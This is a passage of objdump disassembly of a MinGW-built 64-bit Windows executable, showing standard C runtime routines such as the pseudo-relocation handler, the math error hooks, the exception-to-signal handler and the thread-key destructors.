   140002d2a:	48 8b 05 67 c3 00 00 	mov    0xc367(%rip),%rax        # 14000f098 <the_secs>
   140002d31:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002d36:	48 89 4c 18 18       	mov    %rcx,0x18(%rax,%rbx,1)
   140002d3b:	ff 15 2f d6 00 00    	call   *0xd62f(%rip)        # 140010370 <__imp_VirtualQuery>
   140002d41:	48 85 c0             	test   %rax,%rax
   140002d44:	0f 84 7d 00 00 00    	je     140002dc7 <mark_section_writable+0x137>
   140002d4a:	8b 44 24 44          	mov    0x44(%rsp),%eax
   140002d4e:	8d 50 fc             	lea    -0x4(%rax),%edx
   140002d51:	83 e2 fb             	and    $0xfffffffb,%edx
   140002d54:	74 08                	je     140002d5e <mark_section_writable+0xce>
   140002d56:	8d 50 c0             	lea    -0x40(%rax),%edx
   140002d59:	83 e2 bf             	and    $0xffffffbf,%edx
   140002d5c:	75 12                	jne    140002d70 <mark_section_writable+0xe0>
   140002d5e:	83 05 2f c3 00 00 01 	addl   $0x1,0xc32f(%rip)        # 14000f094 <maxSections>
   140002d65:	48 83 c4 50          	add    $0x50,%rsp
   140002d69:	5b                   	pop    %rbx
   140002d6a:	5e                   	pop    %rsi
   140002d6b:	5f                   	pop    %rdi
   140002d6c:	c3                   	ret
   140002d6d:	0f 1f 00             	nopl   (%rax)
   140002d70:	83 f8 02             	cmp    $0x2,%eax
   140002d73:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140002d78:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140002d7d:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140002d83:	b8 04 00 00 00       	mov    $0x4,%eax
   140002d88:	44 0f 44 c0          	cmove  %eax,%r8d
   140002d8c:	48 03 1d 05 c3 00 00 	add    0xc305(%rip),%rbx        # 14000f098 <the_secs>
   140002d93:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   140002d97:	49 89 d9             	mov    %rbx,%r9
   140002d9a:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   140002d9e:	ff 15 c4 d5 00 00    	call   *0xd5c4(%rip)        # 140010368 <__imp_VirtualProtect>
   140002da4:	85 c0                	test   %eax,%eax
   140002da6:	75 b6                	jne    140002d5e <mark_section_writable+0xce>
   140002da8:	ff 15 62 d5 00 00    	call   *0xd562(%rip)        # 140010310 <__imp_GetLastError>
   140002dae:	48 8d 0d e3 86 00 00 	lea    0x86e3(%rip),%rcx        # 14000b498 <.rdata+0x78>
   140002db5:	89 c2                	mov    %eax,%edx
   140002db7:	e8 64 fe ff ff       	call   140002c20 <__report_error>
   140002dbc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002dc0:	31 f6                	xor    %esi,%esi
   140002dc2:	e9 21 ff ff ff       	jmp    140002ce8 <mark_section_writable+0x58>
   140002dc7:	48 8b 05 ca c2 00 00 	mov    0xc2ca(%rip),%rax        # 14000f098 <the_secs>
   140002dce:	8b 57 08             	mov    0x8(%rdi),%edx
   140002dd1:	48 8d 0d 88 86 00 00 	lea    0x8688(%rip),%rcx        # 14000b460 <.rdata+0x40>
   140002dd8:	4c 8b 44 18 18       	mov    0x18(%rax,%rbx,1),%r8
   140002ddd:	e8 3e fe ff ff       	call   140002c20 <__report_error>
   140002de2:	48 89 da             	mov    %rbx,%rdx
   140002de5:	48 8d 0d 54 86 00 00 	lea    0x8654(%rip),%rcx        # 14000b440 <.rdata+0x20>
   140002dec:	e8 2f fe ff ff       	call   140002c20 <__report_error>
   140002df1:	90                   	nop
   140002df2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002df9:	00 00 00 00 
   140002dfd:	0f 1f 00             	nopl   (%rax)

0000000140002e00 <_pei386_runtime_relocator>:
   140002e00:	55                   	push   %rbp
   140002e01:	41 57                	push   %r15
   140002e03:	41 56                	push   %r14
   140002e05:	41 55                	push   %r13
   140002e07:	41 54                	push   %r12
   140002e09:	57                   	push   %rdi
   140002e0a:	56                   	push   %rsi
   140002e0b:	53                   	push   %rbx
   140002e0c:	48 83 ec 48          	sub    $0x48,%rsp
   140002e10:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140002e15:	44 8b 25 74 c2 00 00 	mov    0xc274(%rip),%r12d        # 14000f090 <was_init.0>
   140002e1c:	45 85 e4             	test   %r12d,%r12d
   140002e1f:	74 17                	je     140002e38 <_pei386_runtime_relocator+0x38>
   140002e21:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   140002e25:	5b                   	pop    %rbx
   140002e26:	5e                   	pop    %rsi
   140002e27:	5f                   	pop    %rdi
   140002e28:	41 5c                	pop    %r12
   140002e2a:	41 5d                	pop    %r13
   140002e2c:	41 5e                	pop    %r14
   140002e2e:	41 5f                	pop    %r15
   140002e30:	5d                   	pop    %rbp
   140002e31:	c3                   	ret
   140002e32:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002e38:	c7 05 4e c2 00 00 01 	movl   $0x1,0xc24e(%rip)        # 14000f090 <was_init.0>
   140002e3f:	00 00 00 
   140002e42:	e8 49 09 00 00       	call   140003790 <__mingw_GetSectionCount>
   140002e47:	48 98                	cltq
   140002e49:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140002e4d:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
   140002e54:	00 
   140002e55:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140002e59:	e8 92 0b 00 00       	call   1400039f0 <___chkstk_ms>
   140002e5e:	4c 8b 2d 1b 8b 00 00 	mov    0x8b1b(%rip),%r13        # 14000b980 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST_END__>
   140002e65:	48 8b 1d 24 8b 00 00 	mov    0x8b24(%rip),%rbx        # 14000b990 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST__>
   140002e6c:	48 29 c4             	sub    %rax,%rsp
   140002e6f:	c7 05 1b c2 00 00 00 	movl   $0x0,0xc21b(%rip)        # 14000f094 <maxSections>
   140002e76:	00 00 00 
   140002e79:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140002e7e:	48 89 05 13 c2 00 00 	mov    %rax,0xc213(%rip)        # 14000f098 <the_secs>
   140002e85:	4c 89 e8             	mov    %r13,%rax
   140002e88:	48 29 d8             	sub    %rbx,%rax
   140002e8b:	48 83 f8 07          	cmp    $0x7,%rax
   140002e8f:	7e 90                	jle    140002e21 <_pei386_runtime_relocator+0x21>
   140002e91:	48 83 f8 0b          	cmp    $0xb,%rax
   140002e95:	0f 8f 5d 01 00 00    	jg     140002ff8 <_pei386_runtime_relocator+0x1f8>
   140002e9b:	8b 03                	mov    (%rbx),%eax
   140002e9d:	85 c0                	test   %eax,%eax
   140002e9f:	0f 85 5b 02 00 00    	jne    140003100 <_pei386_runtime_relocator+0x300>
   140002ea5:	8b 43 04             	mov    0x4(%rbx),%eax
   140002ea8:	85 c0                	test   %eax,%eax
   140002eaa:	0f 85 50 02 00 00    	jne    140003100 <_pei386_runtime_relocator+0x300>
   140002eb0:	8b 53 08             	mov    0x8(%rbx),%edx
   140002eb3:	83 fa 01             	cmp    $0x1,%edx
   140002eb6:	0f 85 9a 02 00 00    	jne    140003156 <_pei386_runtime_relocator+0x356>
   140002ebc:	48 83 c3 0c          	add    $0xc,%rbx
   140002ec0:	4c 39 eb             	cmp    %r13,%rbx
   140002ec3:	0f 83 58 ff ff ff    	jae    140002e21 <_pei386_runtime_relocator+0x21>
   140002ec9:	4c 8b 35 a0 8a 00 00 	mov    0x8aa0(%rip),%r14        # 14000b970 <.refptr.__ImageBase>
   140002ed0:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   140002ed6:	eb 6b                	jmp    140002f43 <_pei386_runtime_relocator+0x143>
   140002ed8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002edf:	00 
   140002ee0:	83 f9 08             	cmp    $0x8,%ecx
   140002ee3:	0f 84 37 01 00 00    	je     140003020 <_pei386_runtime_relocator+0x220>
   140002ee9:	83 f9 10             	cmp    $0x10,%ecx
   140002eec:	0f 85 40 02 00 00    	jne    140003132 <_pei386_runtime_relocator+0x332>
   140002ef2:	0f b7 37             	movzwl (%rdi),%esi
   140002ef5:	81 e2 c0 00 00 00    	and    $0xc0,%edx
   140002efb:	66 85 f6             	test   %si,%si
   140002efe:	0f 89 e4 01 00 00    	jns    1400030e8 <_pei386_runtime_relocator+0x2e8>
   140002f04:	48 81 ce 00 00 ff ff 	or     $0xffffffffffff0000,%rsi
   140002f0b:	48 29 c6             	sub    %rax,%rsi
   140002f0e:	4c 01 ce             	add    %r9,%rsi
   140002f11:	85 d2                	test   %edx,%edx
   140002f13:	75 1a                	jne    140002f2f <_pei386_runtime_relocator+0x12f>
   140002f15:	48 81 fe ff ff 00 00 	cmp    $0xffff,%rsi
   140002f1c:	0f 8f 1e 02 00 00    	jg     140003140 <_pei386_runtime_relocator+0x340>
   140002f22:	48 81 fe 00 80 ff ff 	cmp    $0xffffffffffff8000,%rsi
   140002f29:	0f 8c 11 02 00 00    	jl     140003140 <_pei386_runtime_relocator+0x340>
   140002f2f:	48 89 f9             	mov    %rdi,%rcx
   140002f32:	e8 59 fd ff ff       	call   140002c90 <mark_section_writable>
   140002f37:	66 89 37             	mov    %si,(%rdi)
   140002f3a:	48 83 c3 0c          	add    $0xc,%rbx
   140002f3e:	4c 39 eb             	cmp    %r13,%rbx
   140002f41:	73 5d                	jae    140002fa0 <_pei386_runtime_relocator+0x1a0>
   140002f43:	8b 03                	mov    (%rbx),%eax
   140002f45:	8b 53 08             	mov    0x8(%rbx),%edx
   140002f48:	8b 7b 04             	mov    0x4(%rbx),%edi
   140002f4b:	4c 01 f0             	add    %r14,%rax
   140002f4e:	0f b6 ca             	movzbl %dl,%ecx
   140002f51:	4c 8b 08             	mov    (%rax),%r9
   140002f54:	4c 01 f7             	add    %r14,%rdi
   140002f57:	83 f9 20             	cmp    $0x20,%ecx
   140002f5a:	0f 84 10 01 00 00    	je     140003070 <_pei386_runtime_relocator+0x270>
   140002f60:	0f 86 7a ff ff ff    	jbe    140002ee0 <_pei386_runtime_relocator+0xe0>
   140002f66:	83 f9 40             	cmp    $0x40,%ecx
   140002f69:	0f 85 c3 01 00 00    	jne    140003132 <_pei386_runtime_relocator+0x332>
   140002f6f:	48 8b 37             	mov    (%rdi),%rsi
   140002f72:	48 29 c6             	sub    %rax,%rsi
   140002f75:	4c 01 ce             	add    %r9,%rsi
   140002f78:	81 e2 c0 00 00 00    	and    $0xc0,%edx
   140002f7e:	75 09                	jne    140002f89 <_pei386_runtime_relocator+0x189>
   140002f80:	48 85 f6             	test   %rsi,%rsi
   140002f83:	0f 89 b7 01 00 00    	jns    140003140 <_pei386_runtime_relocator+0x340>
   140002f89:	48 89 f9             	mov    %rdi,%rcx
   140002f8c:	48 83 c3 0c          	add    $0xc,%rbx
   140002f90:	e8 fb fc ff ff       	call   140002c90 <mark_section_writable>
   140002f95:	48 89 37             	mov    %rsi,(%rdi)
   140002f98:	4c 39 eb             	cmp    %r13,%rbx
   140002f9b:	72 a6                	jb     140002f43 <_pei386_runtime_relocator+0x143>
   140002f9d:	0f 1f 00             	nopl   (%rax)
   140002fa0:	8b 0d ee c0 00 00    	mov    0xc0ee(%rip),%ecx        # 14000f094 <maxSections>
   140002fa6:	85 c9                	test   %ecx,%ecx
   140002fa8:	0f 8e 73 fe ff ff    	jle    140002e21 <_pei386_runtime_relocator+0x21>
   140002fae:	48 8b 35 b3 d3 00 00 	mov    0xd3b3(%rip),%rsi        # 140010368 <__imp_VirtualProtect>
   140002fb5:	31 db                	xor    %ebx,%ebx
   140002fb7:	48 8d 7d fc          	lea    -0x4(%rbp),%rdi
   140002fbb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002fc0:	48 8b 05 d1 c0 00 00 	mov    0xc0d1(%rip),%rax        # 14000f098 <the_secs>
   140002fc7:	48 01 d8             	add    %rbx,%rax
   140002fca:	44 8b 00             	mov    (%rax),%r8d
   140002fcd:	45 85 c0             	test   %r8d,%r8d
   140002fd0:	74 0d                	je     140002fdf <_pei386_runtime_relocator+0x1df>
   140002fd2:	48 8b 50 10          	mov    0x10(%rax),%rdx
   140002fd6:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140002fda:	49 89 f9             	mov    %rdi,%r9
   140002fdd:	ff d6                	call   *%rsi
   140002fdf:	41 83 c4 01          	add    $0x1,%r12d
   140002fe3:	48 83 c3 28          	add    $0x28,%rbx
   140002fe7:	44 3b 25 a6 c0 00 00 	cmp    0xc0a6(%rip),%r12d        # 14000f094 <maxSections>
   140002fee:	7c d0                	jl     140002fc0 <_pei386_runtime_relocator+0x1c0>
   140002ff0:	e9 2c fe ff ff       	jmp    140002e21 <_pei386_runtime_relocator+0x21>
   140002ff5:	0f 1f 00             	nopl   (%rax)
   140002ff8:	8b 13                	mov    (%rbx),%edx
   140002ffa:	85 d2                	test   %edx,%edx
   140002ffc:	0f 85 fe 00 00 00    	jne    140003100 <_pei386_runtime_relocator+0x300>
   140003002:	8b 43 04             	mov    0x4(%rbx),%eax
   140003005:	89 c1                	mov    %eax,%ecx
   140003007:	0b 4b 08             	or     0x8(%rbx),%ecx
   14000300a:	0f 85 98 fe ff ff    	jne    140002ea8 <_pei386_runtime_relocator+0xa8>
   140003010:	48 83 c3 0c          	add    $0xc,%rbx
   140003014:	e9 82 fe ff ff       	jmp    140002e9b <_pei386_runtime_relocator+0x9b>
   140003019:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003020:	0f b6 37             	movzbl (%rdi),%esi
   140003023:	81 e2 c0 00 00 00    	and    $0xc0,%edx
   140003029:	40 84 f6             	test   %sil,%sil
   14000302c:	0f 89 9e 00 00 00    	jns    1400030d0 <_pei386_runtime_relocator+0x2d0>
   140003032:	48 81 ce 00 ff ff ff 	or     $0xffffffffffffff00,%rsi
   140003039:	48 29 c6             	sub    %rax,%rsi
   14000303c:	4c 01 ce             	add    %r9,%rsi
   14000303f:	85 d2                	test   %edx,%edx
   140003041:	75 17                	jne    14000305a <_pei386_runtime_relocator+0x25a>
   140003043:	48 81 fe ff 00 00 00 	cmp    $0xff,%rsi
   14000304a:	0f 8f f0 00 00 00    	jg     140003140 <_pei386_runtime_relocator+0x340>
   140003050:	48 83 fe 80          	cmp    $0xffffffffffffff80,%rsi
   140003054:	0f 8c e6 00 00 00    	jl     140003140 <_pei386_runtime_relocator+0x340>
   14000305a:	48 89 f9             	mov    %rdi,%rcx
   14000305d:	e8 2e fc ff ff       	call   140002c90 <mark_section_writable>
   140003062:	40 88 37             	mov    %sil,(%rdi)
   140003065:	e9 d0 fe ff ff       	jmp    140002f3a <_pei386_runtime_relocator+0x13a>
   14000306a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003070:	8b 37                	mov    (%rdi),%esi
   140003072:	81 e2 c0 00 00 00    	and    $0xc0,%edx
   140003078:	85 f6                	test   %esi,%esi
   14000307a:	79 44                	jns    1400030c0 <_pei386_runtime_relocator+0x2c0>
   14000307c:	49 bb 00 00 00 00 ff 	movabs $0xffffffff00000000,%r11
   140003083:	ff ff ff 
   140003086:	4c 09 de             	or     %r11,%rsi
   140003089:	48 29 c6             	sub    %rax,%rsi
   14000308c:	4c 01 ce             	add    %r9,%rsi
   14000308f:	85 d2                	test   %edx,%edx
   140003091:	75 1c                	jne    1400030af <_pei386_runtime_relocator+0x2af>
   140003093:	4c 39 fe             	cmp    %r15,%rsi
   140003096:	0f 8f a4 00 00 00    	jg     140003140 <_pei386_runtime_relocator+0x340>
   14000309c:	48 b8 ff ff ff 7f ff 	movabs $0xffffffff7fffffff,%rax
   1400030a3:	ff ff ff 
   1400030a6:	48 39 c6             	cmp    %rax,%rsi
   1400030a9:	0f 8e 91 00 00 00    	jle    140003140 <_pei386_runtime_relocator+0x340>
   1400030af:	48 89 f9             	mov    %rdi,%rcx
   1400030b2:	e8 d9 fb ff ff       	call   140002c90 <mark_section_writable>
   1400030b7:	89 37                	mov    %esi,(%rdi)
   1400030b9:	e9 7c fe ff ff       	jmp    140002f3a <_pei386_runtime_relocator+0x13a>
   1400030be:	66 90                	xchg   %ax,%ax
   1400030c0:	48 29 c6             	sub    %rax,%rsi
   1400030c3:	4c 01 ce             	add    %r9,%rsi
   1400030c6:	85 d2                	test   %edx,%edx
   1400030c8:	74 c9                	je     140003093 <_pei386_runtime_relocator+0x293>
   1400030ca:	eb e3                	jmp    1400030af <_pei386_runtime_relocator+0x2af>
   1400030cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400030d0:	48 29 c6             	sub    %rax,%rsi
   1400030d3:	4c 01 ce             	add    %r9,%rsi
   1400030d6:	85 d2                	test   %edx,%edx
   1400030d8:	0f 84 65 ff ff ff    	je     140003043 <_pei386_runtime_relocator+0x243>
   1400030de:	e9 77 ff ff ff       	jmp    14000305a <_pei386_runtime_relocator+0x25a>
   1400030e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400030e8:	48 29 c6             	sub    %rax,%rsi
   1400030eb:	4c 01 ce             	add    %r9,%rsi
   1400030ee:	85 d2                	test   %edx,%edx
   1400030f0:	0f 84 1f fe ff ff    	je     140002f15 <_pei386_runtime_relocator+0x115>
   1400030f6:	e9 34 fe ff ff       	jmp    140002f2f <_pei386_runtime_relocator+0x12f>
   1400030fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003100:	4c 39 eb             	cmp    %r13,%rbx
   140003103:	0f 83 18 fd ff ff    	jae    140002e21 <_pei386_runtime_relocator+0x21>
   140003109:	4c 8b 35 60 88 00 00 	mov    0x8860(%rip),%r14        # 14000b970 <.refptr.__ImageBase>
   140003110:	8b 73 04             	mov    0x4(%rbx),%esi
   140003113:	8b 3b                	mov    (%rbx),%edi
   140003115:	48 83 c3 08          	add    $0x8,%rbx
   140003119:	4c 01 f6             	add    %r14,%rsi
   14000311c:	03 3e                	add    (%rsi),%edi
   14000311e:	48 89 f1             	mov    %rsi,%rcx
   140003121:	e8 6a fb ff ff       	call   140002c90 <mark_section_writable>
   140003126:	89 3e                	mov    %edi,(%rsi)
   140003128:	4c 39 eb             	cmp    %r13,%rbx
   14000312b:	72 e3                	jb     140003110 <_pei386_runtime_relocator+0x310>
   14000312d:	e9 6e fe ff ff       	jmp    140002fa0 <_pei386_runtime_relocator+0x1a0>
   140003132:	89 ca                	mov    %ecx,%edx
   140003134:	48 8d 0d bd 83 00 00 	lea    0x83bd(%rip),%rcx        # 14000b4f8 <.rdata+0xd8>
   14000313b:	e8 e0 fa ff ff       	call   140002c20 <__report_error>
   140003140:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003145:	89 ca                	mov    %ecx,%edx
   140003147:	49 89 f8             	mov    %rdi,%r8
   14000314a:	48 8d 0d d7 83 00 00 	lea    0x83d7(%rip),%rcx        # 14000b528 <.rdata+0x108>
   140003151:	e8 ca fa ff ff       	call   140002c20 <__report_error>
   140003156:	48 8d 0d 63 83 00 00 	lea    0x8363(%rip),%rcx        # 14000b4c0 <.rdata+0xa0>
   14000315d:	e8 be fa ff ff       	call   140002c20 <__report_error>
   140003162:	90                   	nop
   140003163:	90                   	nop
   140003164:	90                   	nop
   140003165:	90                   	nop
   140003166:	90                   	nop
   140003167:	90                   	nop
   140003168:	90                   	nop
   140003169:	90                   	nop
   14000316a:	90                   	nop
   14000316b:	90                   	nop
   14000316c:	90                   	nop
   14000316d:	90                   	nop
   14000316e:	90                   	nop
   14000316f:	90                   	nop

0000000140003170 <__mingw_raise_matherr>:
   140003170:	48 83 ec 58          	sub    $0x58,%rsp
   140003174:	48 8b 05 25 bf 00 00 	mov    0xbf25(%rip),%rax        # 14000f0a0 <stUserMathErr>
   14000317b:	66 0f 14 d3          	unpcklpd %xmm3,%xmm2
   14000317f:	48 85 c0             	test   %rax,%rax
   140003182:	74 25                	je     1400031a9 <__mingw_raise_matherr+0x39>
   140003184:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   14000318b:	00 00 
   14000318d:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140003191:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003196:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   14000319b:	0f 11 54 24 30       	movups %xmm2,0x30(%rsp)
   1400031a0:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
   1400031a6:	ff d0                	call   *%rax
   1400031a8:	90                   	nop
   1400031a9:	48 83 c4 58          	add    $0x58,%rsp
   1400031ad:	c3                   	ret
   1400031ae:	66 90                	xchg   %ax,%ax

00000001400031b0 <__mingw_setusermatherr>:
   1400031b0:	48 89 0d e9 be 00 00 	mov    %rcx,0xbee9(%rip)        # 14000f0a0 <stUserMathErr>
   1400031b7:	e9 94 61 00 00       	jmp    140009350 <__setusermatherr>
   1400031bc:	90                   	nop
   1400031bd:	90                   	nop
   1400031be:	90                   	nop
   1400031bf:	90                   	nop

00000001400031c0 <_gnu_exception_handler>:
   1400031c0:	53                   	push   %rbx
   1400031c1:	48 83 ec 20          	sub    $0x20,%rsp
   1400031c5:	48 8b 11             	mov    (%rcx),%rdx
   1400031c8:	8b 02                	mov    (%rdx),%eax
   1400031ca:	48 89 cb             	mov    %rcx,%rbx
   1400031cd:	89 c1                	mov    %eax,%ecx
   1400031cf:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
   1400031d5:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
   1400031db:	0f 84 8f 00 00 00    	je     140003270 <_gnu_exception_handler+0xb0>
   1400031e1:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
   1400031e6:	77 47                	ja     14000322f <_gnu_exception_handler+0x6f>
   1400031e8:	3d 8b 00 00 c0       	cmp    $0xc000008b,%eax
   1400031ed:	76 61                	jbe    140003250 <_gnu_exception_handler+0x90>
   1400031ef:	05 73 ff ff 3f       	add    $0x3fffff73,%eax
   1400031f4:	83 f8 09             	cmp    $0x9,%eax
   1400031f7:	77 6b                	ja     140003264 <_gnu_exception_handler+0xa4>
   1400031f9:	48 8d 15 80 83 00 00 	lea    0x8380(%rip),%rdx        # 14000b580 <.rdata>
   140003200:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140003204:	48 01 d0             	add    %rdx,%rax
   140003207:	ff e0                	jmp    *%rax
   140003209:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003210:	31 d2                	xor    %edx,%edx
   140003212:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003217:	e8 d4 61 00 00       	call   1400093f0 <signal>
   14000321c:	48 83 f8 01          	cmp    $0x1,%rax
   140003220:	0f 84 3e 01 00 00    	je     140003364 <_gnu_exception_handler+0x1a4>
   140003226:	48 85 c0             	test   %rax,%rax
   140003229:	0f 85 01 01 00 00    	jne    140003330 <_gnu_exception_handler+0x170>
   14000322f:	48 8b 05 8a be 00 00 	mov    0xbe8a(%rip),%rax        # 14000f0c0 <__mingw_oldexcpt_handler>
   140003236:	48 85 c0             	test   %rax,%rax
   140003239:	74 45                	je     140003280 <_gnu_exception_handler+0xc0>
   14000323b:	48 89 d9             	mov    %rbx,%rcx
   14000323e:	48 83 c4 20          	add    $0x20,%rsp
   140003242:	5b                   	pop    %rbx
   140003243:	48 ff e0             	rex.W jmp *%rax
   140003246:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000324d:	00 00 00 
   140003250:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
   140003255:	0f 84 a5 00 00 00    	je     140003300 <_gnu_exception_handler+0x140>
   14000325b:	77 33                	ja     140003290 <_gnu_exception_handler+0xd0>
   14000325d:	3d 02 00 00 80       	cmp    $0x80000002,%eax
   140003262:	75 cb                	jne    14000322f <_gnu_exception_handler+0x6f>
   140003264:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003269:	48 83 c4 20          	add    $0x20,%rsp
   14000326d:	5b                   	pop    %rbx
   14000326e:	c3                   	ret
   14000326f:	90                   	nop
   140003270:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
   140003274:	0f 85 67 ff ff ff    	jne    1400031e1 <_gnu_exception_handler+0x21>
   14000327a:	eb e8                	jmp    140003264 <_gnu_exception_handler+0xa4>
   14000327c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003280:	31 c0                	xor    %eax,%eax
   140003282:	48 83 c4 20          	add    $0x20,%rsp
   140003286:	5b                   	pop    %rbx
   140003287:	c3                   	ret
   140003288:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000328f:	00 
   140003290:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   140003295:	74 cd                	je     140003264 <_gnu_exception_handler+0xa4>
   140003297:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   14000329c:	75 91                	jne    14000322f <_gnu_exception_handler+0x6f>
   14000329e:	31 d2                	xor    %edx,%edx
   1400032a0:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400032a5:	e8 46 61 00 00       	call   1400093f0 <signal>
   1400032aa:	48 83 f8 01          	cmp    $0x1,%rax
   1400032ae:	0f 84 9c 00 00 00    	je     140003350 <_gnu_exception_handler+0x190>
   1400032b4:	48 85 c0             	test   %rax,%rax
   1400032b7:	0f 84 72 ff ff ff    	je     14000322f <_gnu_exception_handler+0x6f>
   1400032bd:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400032c2:	ff d0                	call   *%rax
   1400032c4:	eb 9e                	jmp    140003264 <_gnu_exception_handler+0xa4>
   1400032c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400032cd:	00 00 00 
   1400032d0:	31 d2                	xor    %edx,%edx
   1400032d2:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400032d7:	e8 14 61 00 00       	call   1400093f0 <signal>
   1400032dc:	48 83 f8 01          	cmp    $0x1,%rax
   1400032e0:	0f 85 40 ff ff ff    	jne    140003226 <_gnu_exception_handler+0x66>
   1400032e6:	ba 01 00 00 00       	mov    $0x1,%edx
   1400032eb:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400032f0:	e8 fb 60 00 00       	call   1400093f0 <signal>
   1400032f5:	e9 6a ff ff ff       	jmp    140003264 <_gnu_exception_handler+0xa4>
   1400032fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003300:	31 d2                	xor    %edx,%edx
   140003302:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140003307:	e8 e4 60 00 00       	call   1400093f0 <signal>
   14000330c:	48 83 f8 01          	cmp    $0x1,%rax
   140003310:	74 2a                	je     14000333c <_gnu_exception_handler+0x17c>
   140003312:	48 85 c0             	test   %rax,%rax
   140003315:	0f 84 14 ff ff ff    	je     14000322f <_gnu_exception_handler+0x6f>
   14000331b:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140003320:	ff d0                	call   *%rax
   140003322:	e9 3d ff ff ff       	jmp    140003264 <_gnu_exception_handler+0xa4>
   140003327:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000332e:	00 00 
   140003330:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003335:	ff d0                	call   *%rax
   140003337:	e9 28 ff ff ff       	jmp    140003264 <_gnu_exception_handler+0xa4>
   14000333c:	ba 01 00 00 00       	mov    $0x1,%edx
   140003341:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140003346:	e8 a5 60 00 00       	call   1400093f0 <signal>
   14000334b:	e9 14 ff ff ff       	jmp    140003264 <_gnu_exception_handler+0xa4>
   140003350:	ba 01 00 00 00       	mov    $0x1,%edx
   140003355:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000335a:	e8 91 60 00 00       	call   1400093f0 <signal>
   14000335f:	e9 00 ff ff ff       	jmp    140003264 <_gnu_exception_handler+0xa4>
   140003364:	ba 01 00 00 00       	mov    $0x1,%edx
   140003369:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000336e:	e8 7d 60 00 00       	call   1400093f0 <signal>
   140003373:	e8 98 f8 ff ff       	call   140002c10 <_fpreset>
   140003378:	e9 e7 fe ff ff       	jmp    140003264 <_gnu_exception_handler+0xa4>
   14000337d:	90                   	nop
   14000337e:	90                   	nop
   14000337f:	90                   	nop

0000000140003380 <__mingwthr_run_key_dtors.part.0>:
   140003380:	41 54                	push   %r12
   140003382:	55                   	push   %rbp
   140003383:	57                   	push   %rdi
   140003384:	56                   	push   %rsi
   140003385:	53                   	push   %rbx
   140003386:	48 83 ec 20          	sub    $0x20,%rsp
   14000338a:	4c 8d 25 6f bd 00 00 	lea    0xbd6f(%rip),%r12        # 14000f100 <__mingwthr_cs>
   140003391:	4c 89 e1             	mov    %r12,%rcx
   140003394:	ff 15 66 cf 00 00    	call   *0xcf66(%rip)        # 140010300 <__imp_EnterCriticalSection>
   14000339a:	48 8b 1d 3f bd 00 00 	mov    0xbd3f(%rip),%rbx        # 14000f0e0 <key_dtor_list>
   1400033a1:	48 85 db             	test   %rbx,%rbx
   1400033a4:	74 36                	je     1400033dc <__mingwthr_run_key_dtors.part.0+0x5c>
   1400033a6:	48 8b 2d b3 cf 00 00 	mov    0xcfb3(%rip),%rbp        # 140010360 <__imp_TlsGetValue>
   1400033ad:	48 8b 3d 5c cf 00 00 	mov    0xcf5c(%rip),%rdi        # 140010310 <__imp_GetLastError>
   1400033b4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400033b8:	8b 0b                	mov    (%rbx),%ecx
   1400033ba:	ff d5                	call   *%rbp
   1400033bc:	48 89 c6             	mov    %rax,%rsi
